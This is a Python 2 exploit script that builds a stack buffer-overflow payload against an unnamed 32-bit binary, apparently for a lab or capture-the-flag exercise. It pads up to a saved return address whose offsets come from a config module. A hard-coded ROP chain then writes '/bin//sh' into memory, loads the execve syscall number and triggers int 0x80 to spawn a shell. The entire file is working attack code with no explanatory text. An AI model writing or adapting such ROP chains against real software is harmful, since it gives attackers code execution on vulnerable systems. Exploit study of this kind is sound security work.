import sys 
from struct import pack
import config 

RA_LOC = config.RA_LOC
BUF_LOC = config.BUF_LOC

exploit = ""
exploit += "X" * (RA_LOC - BUF_LOC)

exploit += pack('<I', 0x08072a7a) # pop edx ; ret
exploit += pack('<I', 0x080ed060) # @ .data
exploit += pack('<I', 0x080ba746) # pop eax ; ret
exploit += '/bin'
exploit += pack('<I', 0x0805799b) # mov dword ptr [edx], eax ; ret
exploit += pack('<I', 0x08072a7a) # pop edx ; ret
exploit += pack('<I', 0x080ed064) # @ .data + 4
exploit += pack('<I', 0x080ba746) # pop eax ; ret
exploit += '//sh'
exploit += pack('<I', 0x0805799b) # mov dword ptr [edx], eax ; ret
exploit += pack('<I', 0x08072a7a) # pop edx ; ret
exploit += pack('<I', 0x080ed068) # @ .data + 8
exploit += pack('<I', 0x08049913) # xor eax, eax ; ret
exploit += pack('<I', 0x0805799b) # mov dword ptr [edx], eax ; ret
exploit += pack('<I', 0x080481d9) # pop ebx ; ret
exploit += pack('<I', 0x080ed060) # @ .data
exploit += pack('<I', 0x08072aa1) # pop ecx ; pop ebx ; ret
exploit += pack('<I', 0x080ed068) # @ .data + 8
exploit += pack('<I', 0x080ed060) # padding without overwrite ebx
exploit += pack('<I', 0x08072a7a) # pop edx ; ret
exploit += pack('<I', 0x080ed068) # @ .data + 8
exploit += pack('<I', 0x08049913) # xor eax, eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x0807e09f) # inc eax ; ret
exploit += pack('<I', 0x08070655) # int 0x80

sys.stdout.write(exploit)
